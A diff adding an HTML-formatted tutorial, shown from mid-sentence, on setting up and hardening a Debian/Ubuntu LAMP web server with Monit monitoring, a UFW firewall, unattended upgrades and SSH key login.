+on your installation some of the following may already be configured.&lt;/p&gt;
+&lt;h3&gt;Create a user account for yourself:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# adduser &amp;lt;user_name&amp;gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Install sudo:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# apt-get install sudo
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Add the newly created user to the sudoers file by running:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# visudo
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Add your username under the existing &lt;code&gt;root&lt;/code&gt; entry:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root ALL=(ALL) ALL
+&amp;lt;user_name&amp;gt; ALL=(ALL) ALL
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Now log out and back in with the new user.&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2&gt;Update Your System&lt;/h2&gt;
+&lt;p&gt;Most installations will not be up-to-date after installation and will be missing
+several bug and security fixes. We must now update the system to pull in all the
+latest patches.&lt;/p&gt;
+&lt;h3&gt;Run system updates:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo apt-get update
+$ sudo apt-get upgrade
+$ sudo apt-get dist-upgrade
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Once all updates are complete, restart your system.&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2&gt;Configure Hostname and Timezone&lt;/h2&gt;
+&lt;p&gt;While the hostname is of minor importance for most things to run properly, it's
+good practice to set it up after installation. The timezone on the other hand
+can have critical effects on the applications and scripts that run on your
+server if not configured properly.&lt;/p&gt;
+&lt;h3&gt;Set the Hostname:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo nano /etc/hostname
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Add your new hostname to this file and save it, then run:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo /etc/init.d/hostname start
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Edit the hosts file:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo nano /etc/hosts
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Add the following if not already present:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;127.0.0.1 localhost.localdomain localhost
+&amp;lt;server_ip&amp;gt; &amp;lt;hostname&amp;gt;.example.com &amp;lt;hostname&amp;gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Set the Timezone:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo dpkg-reconfigure tzdata
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;hr /&gt;
+&lt;h2&gt;Set Up LAMP Server with APC and PHPMyAdmin&lt;/h2&gt;
+&lt;p&gt;Installing the LAMP stack is quick and painless with apt. Simply use the
+following commands to get everything installed.&lt;/p&gt;
+&lt;h3&gt;Install LAMP stack on Ubuntu:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo apt-get install lamp-server&lt;span class="se"&gt;\^&lt;/span&gt; php-apc phpmyadmin
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Install LAMP stack on Debian:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo apt-get install apache2 mysql-server php5 php-pear php5-mysql php-apc phpmyadmin
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We will also need a mail server to handle outgoing email requests.&lt;/p&gt;
+&lt;h3&gt;Insatll Postfix Mail Server:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo apt-get install postfix
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;When installing postfix you'll go through some configuration screens. The
+defaults should be fine for a basic web server setup.&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2&gt;Configure PHP and APC&lt;/h2&gt;
+&lt;p&gt;Now that you have your LAMP stack setup you will need to configure it for
+running in a production environment. Some of the following settings may already
+be set, but it's a good idea to check them all anyway.&lt;/p&gt;
+&lt;h3&gt;Enable mod_rewrite:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo a2enmod rewrite
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Configure PHP:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo nano /etc/php5/apache2/php.ini
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Now locate and modify the following values:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;short_open_tag = On
+max_execution_time = 30
+memory_limit = 128M
+error_reporting = E_ALL &amp;amp; \~E_DEPRECATED
+display_errors = Off
+log_errors = On
+post_max_size = 8M
+upload_max_filesize = 8M
+date.timezone = &amp;lt;your_timezone&amp;gt; ; See: http://php.net/date.timezone
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Edit your APC config:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo nano /etc/php5/conf.d/apc.ini
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Add the following:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;extension = apc.so
+apc.shm_size = 128
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Restart Apache:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo /etc/init.d/apache2 restart
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;hr /&gt;
+&lt;h2&gt;Set Web Directory User and Permissions&lt;/h2&gt;
+&lt;p&gt;Now that you have everything installed and configured you'll need to set up some
+file permissions to allow Apache to read from, and you to write to, the web
+directory. This will be accomplished by changing the owner of the web directory,
+adding the Apache user and your user to this group and setting the guid bit
+forcing all new files/folders to have the same group permissions.&lt;/p&gt;
+&lt;h3&gt;Create a new group:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo addgroup webdev
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Change the group of your web directory:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo chgrp -R webdev /var/www/
+$ sudo chmod -R g+rw /var/www/
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Set the guid bit on all folders in your web directory:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo find /var/www -type d -exec chmod +s &lt;span class="o"&gt;{}&lt;/span&gt; &lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Add Apache to the webdev group:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo usermod -a -G webdev www-data
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Add your user to the webdev group:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo usermod -a -G webdev &amp;lt;user_name&amp;gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;hr /&gt;
+&lt;h2&gt;Enable System Monitoring and Alerts&lt;/h2&gt;
+&lt;p&gt;Even the best configured servers have problems every now and again. To monitor
+our servers resources we will install and configure
+&lt;a href="http://mmonit.com/monit/"&gt;Monit&lt;/a&gt;. Monit allows us to set custom events to
+monitor and define the actions to be taken.&lt;/p&gt;
+&lt;h3&gt;Install Monit:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo apt-get install monit
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Edit the monitrc file:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo nano /etc/monit/monitrc
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Copy/paste the following configuration file and change values where you need to.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;### Monit configuration:
+
+################################################################################
+## Monit control file
+################################################################################
+
+set daemon 120 # Check services at 2-minute intervals
+set logfile syslog facility log_daemon # Set logging to the
+systemlog
+set alert &amp;lt;email_address&amp;gt; # Set your email address
+
+set mailserver localhost
+with timeout 15 seconds
+
+set httpd port 2812 and
+allow &amp;lt;user_name&amp;gt;: &amp;lt;password&amp;gt; # set user name and password here
+
+################################################################################
+## Services
+################################################################################
+
+check system &amp;lt;hostname&amp;gt;
+if loadavg (1min) \&amp;gt; 4 then alert
+if loadavg (5min) \&amp;gt; 2 then alert
+if memory usage \&amp;gt; 80% then alert
+if cpu usage (user) \&amp;gt; 70% then alert
+if cpu usage (system) \&amp;gt; 30% then alert
+if cpu usage (wait) \&amp;gt; 20% then alert
+
+check process apache with pidfile /var/run/apache2.pid
+start program = &amp;quot;/etc/init.d/apache2 start&amp;quot; with timeout 60 seconds
+stop program = &amp;quot;/etc/init.d/apache2 stop&amp;quot;
+if cpu \&amp;gt; 60% for 2 cycles then alert
+if cpu \&amp;gt; 90% for 5 cycles then restart
+if totalmem \&amp;gt; 512.0 MB for 5 cycles then alert
+# if totalmem \&amp;gt; 512.0 MB for 5 cycles then restart
+if children \&amp;gt; 250 then restart
+if failed host localhost port 80 protocol http then restart
+if 3 restarts within 5 cycles then timeout
+
+check process mysql with pidfile /var/lib/mysql/&amp;lt;hostname&amp;gt;.pid
+group mysql
+start program = &amp;quot;/etc/init.d/mysql start&amp;quot;
+stop program = &amp;quot;/etc/init.d/mysql stop&amp;quot;
+if failed host localhost port 3306 then restart
+if 5 restarts within 5 cycles then timeout
+
+check process sshd with pidfile /var/run/sshd.pid
+start program &amp;quot;/etc/init.d/ssh start&amp;quot;
+stop program &amp;quot;/etc/init.d/ssh stop&amp;quot;
+if failed port 22 protocol ssh then restart
+if 5 restarts within 5 cycles then timeout
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Edit the monit config file:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ /etc/default/monit
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Enable Monit by setting the following:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# You must set this variable to for monit to start
+startup=1
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Start Monit:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo /etc/init.d/monit start
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;hr /&gt;
+&lt;h2&gt;Set Up UFW (Uncomplicated Firewall)&lt;/h2&gt;
+&lt;p&gt;Being a production system, you shouldn't expose any ports that aren't being
+used. This is where a firewall comes in handy. You will set up the Uncomplicated
+Firewall (UFW), a simplified front-end for iptables.&lt;/p&gt;
+&lt;h3&gt;Install UFW:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo apt-get install ufw
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Configure UFW:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo ufw allow 22
+$ sudo ufw allow 80
+$ sudo ufw allow 443
+$ sudo ufw allow 2812
+$ sudo ufw default deny
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Enable UFW:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo ufw &lt;span class="nb"&gt;enable&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;hr /&gt;
+&lt;h2&gt;Set Up Unattended Upgrades&lt;/h2&gt;
+&lt;p&gt;System updates are released frequently and while manually installing these
+updates usually only takes a few minutes a day, automating these updates is
+easy.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;WARNING:&lt;/strong&gt; Applying any updates can potentially break your system and
+automating these may leave your system broken without your knowledge. However,
+in the several years I've been administering servers I've never personally seen
+an update do any damage. I also feel the benefits of automating security updates
+outweighs the potential downsides of missing a critical update that may leave
+your system vulnerable to attack.&lt;/p&gt;
+&lt;h3&gt;Install Unattended Upgrades:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo apt-get install unattended-upgrades
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Run the first time configuration:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo dpkg-reconfigure unattended-upgrades
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Configure other settings:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo nano /etc/apt/apt.conf.d/50unattended-upgrades
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Edit the following:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt; &lt;span class="nt"&gt;Automatically&lt;/span&gt; &lt;span class="nt"&gt;upgrade&lt;/span&gt; &lt;span class="nt"&gt;packages&lt;/span&gt; &lt;span class="nt"&gt;from&lt;/span&gt; &lt;span class="nt"&gt;these&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;origin&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;archive&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nt"&gt;pairs&lt;/span&gt;
+&lt;span class="nt"&gt;Unattended-Upgrade&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;:Allowed-Origins&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;Ubuntu lucid-security&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="o"&gt;//&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Ubuntu lucid-updates&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+
+&lt;span class="o"&gt;//&lt;/span&gt; &lt;span class="nt"&gt;List&lt;/span&gt; &lt;span class="nt"&gt;of&lt;/span&gt; &lt;span class="nt"&gt;packages&lt;/span&gt; &lt;span class="nt"&gt;to&lt;/span&gt; &lt;span class="nt"&gt;not&lt;/span&gt; &lt;span class="nt"&gt;update&lt;/span&gt;
+&lt;span class="nt"&gt;Unattended-Upgrade&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;:Package-Blacklist&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;span class="o"&gt;//&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;vim&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="o"&gt;//&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;libc6&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="o"&gt;//&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;libc6-dev&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="o"&gt;//&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;libc6-i686&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+
+&lt;span class="o"&gt;//&lt;/span&gt; &lt;span class="nt"&gt;Send&lt;/span&gt; &lt;span class="nt"&gt;email&lt;/span&gt; &lt;span class="nt"&gt;to&lt;/span&gt; &lt;span class="nt"&gt;this&lt;/span&gt; &lt;span class="nt"&gt;address&lt;/span&gt; &lt;span class="nt"&gt;for&lt;/span&gt; &lt;span class="nt"&gt;problems&lt;/span&gt; &lt;span class="nt"&gt;or&lt;/span&gt; &lt;span class="nt"&gt;packages&lt;/span&gt; &lt;span class="nt"&gt;upgrades&lt;/span&gt;
+&lt;span class="o"&gt;//&lt;/span&gt; &lt;span class="nt"&gt;If&lt;/span&gt; &lt;span class="nt"&gt;empty&lt;/span&gt; &lt;span class="nt"&gt;or&lt;/span&gt; &lt;span class="nt"&gt;unset&lt;/span&gt; &lt;span class="nt"&gt;then&lt;/span&gt; &lt;span class="nt"&gt;no&lt;/span&gt; &lt;span class="nt"&gt;email&lt;/span&gt; &lt;span class="nt"&gt;is&lt;/span&gt; &lt;span class="nt"&gt;sent&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;make&lt;/span&gt; &lt;span class="nt"&gt;sure&lt;/span&gt; &lt;span class="nt"&gt;that&lt;/span&gt; &lt;span class="nt"&gt;you&lt;/span&gt;
+&lt;span class="o"&gt;//&lt;/span&gt; &lt;span class="nt"&gt;have&lt;/span&gt; &lt;span class="nt"&gt;a&lt;/span&gt; &lt;span class="nt"&gt;working&lt;/span&gt; &lt;span class="nt"&gt;mail&lt;/span&gt; &lt;span class="nt"&gt;setup&lt;/span&gt; &lt;span class="nt"&gt;on&lt;/span&gt; &lt;span class="nt"&gt;your&lt;/span&gt; &lt;span class="nt"&gt;system&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nt"&gt;The&lt;/span&gt; &lt;span class="nt"&gt;package&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;mailx&amp;#39;&lt;/span&gt;
+&lt;span class="o"&gt;//&lt;/span&gt; &lt;span class="nt"&gt;must&lt;/span&gt; &lt;span class="nt"&gt;be&lt;/span&gt; &lt;span class="nt"&gt;installed&lt;/span&gt; &lt;span class="nt"&gt;or&lt;/span&gt; &lt;span class="nt"&gt;anything&lt;/span&gt; &lt;span class="nt"&gt;that&lt;/span&gt; &lt;span class="nt"&gt;provides&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;mail&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;
+&lt;span class="nt"&gt;Unattended-Upgrade&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;:Mail&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;lt;your_email_address&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+
+&lt;span class="o"&gt;//&lt;/span&gt; &lt;span class="nt"&gt;Do&lt;/span&gt; &lt;span class="nt"&gt;automatic&lt;/span&gt; &lt;span class="nt"&gt;removal&lt;/span&gt; &lt;span class="nt"&gt;of&lt;/span&gt; &lt;span class="nt"&gt;new&lt;/span&gt; &lt;span class="nt"&gt;unused&lt;/span&gt; &lt;span class="nt"&gt;dependencies&lt;/span&gt; &lt;span class="nt"&gt;after&lt;/span&gt; &lt;span class="nt"&gt;the&lt;/span&gt; &lt;span class="nt"&gt;upgrade&lt;/span&gt;
+&lt;span class="o"&gt;//&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;equivalent&lt;/span&gt; &lt;span class="nt"&gt;to&lt;/span&gt; &lt;span class="nt"&gt;apt-get&lt;/span&gt; &lt;span class="nt"&gt;autoremove&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="nt"&gt;Unattended-Upgrade&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;:Remove-Unused-Dependencies&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;false&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+
+&lt;span class="o"&gt;//&lt;/span&gt; &lt;span class="nt"&gt;Automatically&lt;/span&gt; &lt;span class="nt"&gt;reboot&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nt"&gt;WITHOUT&lt;/span&gt; &lt;span class="nt"&gt;CONFIRMATION&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="nt"&gt;if&lt;/span&gt; &lt;span class="nt"&gt;a&lt;/span&gt;
+&lt;span class="o"&gt;//&lt;/span&gt; &lt;span class="nt"&gt;the&lt;/span&gt; &lt;span class="nt"&gt;file&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;var&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;run&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;reboot-required&lt;/span&gt; &lt;span class="nt"&gt;is&lt;/span&gt; &lt;span class="nt"&gt;found&lt;/span&gt; &lt;span class="nt"&gt;after&lt;/span&gt; &lt;span class="nt"&gt;the&lt;/span&gt; &lt;span class="nt"&gt;upgrade&lt;/span&gt;
+&lt;span class="nt"&gt;Unattended-Upgrade&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;:Automatic-Reboot&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;false&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+
+&lt;span class="o"&gt;//&lt;/span&gt; &lt;span class="nt"&gt;Use&lt;/span&gt; &lt;span class="nt"&gt;apt&lt;/span&gt; &lt;span class="nt"&gt;bandwidth&lt;/span&gt; &lt;span class="nt"&gt;limit&lt;/span&gt; &lt;span class="nt"&gt;feature&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;this&lt;/span&gt; &lt;span class="nt"&gt;example&lt;/span&gt; &lt;span class="nt"&gt;limits&lt;/span&gt; &lt;span class="nt"&gt;the&lt;/span&gt; &lt;span class="nt"&gt;download&lt;/span&gt;
+&lt;span class="o"&gt;//&lt;/span&gt; &lt;span class="nt"&gt;speed&lt;/span&gt; &lt;span class="nt"&gt;to&lt;/span&gt; &lt;span class="nt"&gt;1024kb&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;sec&lt;/span&gt;
+&lt;span class="nt"&gt;Acquire&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;:http&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;:Dl-Limit&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;1024&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Enable Unattended Upgrades:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo nano /etc/apt/apt.conf.d/10periodic
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Modify the following:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;APT&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;:Periodic&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;:Update-Package-Lists&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+&lt;span class="nt"&gt;APT&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;:Periodic&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;:Download-Upgradeable-Packages&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+&lt;span class="nt"&gt;APT&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;:Periodic&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;:AutocleanInterval&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;5&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+&lt;span class="nt"&gt;APT&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;:Periodic&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;:Unattended-Upgrade&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;hr /&gt;
+&lt;h2&gt;Disable Root Login via Password&lt;/h2&gt;
+&lt;p&gt;One last step in securing your server is to disable logging in as root over SSH
+with a password. This will prevent any automated bots from brute-forcing their
+way into your root account. You will still be able to run as root by logging
+into with your non-privileged user account and running &lt;code&gt;sudo su&lt;/code&gt;.&lt;/p&gt;
+&lt;h3&gt;Edit your SSH config:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo nano /etc/ssh/sshd_config
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Uncomment the following line:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;PermitRootLogin no
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Save and exit this file.&lt;/p&gt;
+&lt;h3&gt;Restart the SSH daemon:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo /etc/init.d/sshd restart
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;hr /&gt;
+&lt;h2&gt;Set Up SSH Key Authentication&lt;/h2&gt;
+&lt;p&gt;By default, your server will allow you to log in with a user name and password.
+While secure, this method of logging in has some significant weaknesses and is
+generally inconvenient. To remedy the situation generate an SSH key and
+associate it with your server for future authentication.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; The following assumes you are using a derivative of Linux on your
+client workstation.&lt;/p&gt;
+&lt;p&gt;Run these commands from your workstation, NOT the server.&lt;/p&gt;
+&lt;h3&gt;Generate your SSH key pair:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ssh-keygen -t rsa -C &amp;lt;your_email_address&amp;gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Copy your public key to the server:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ssh-copy-id user@example.com
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Now try and log into your server:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ssh user@example.com
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;hr /&gt;
+&lt;h2&gt;Install Some Other Useful Tools:&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo apt-get install bwm-ng htop pastebinit whois
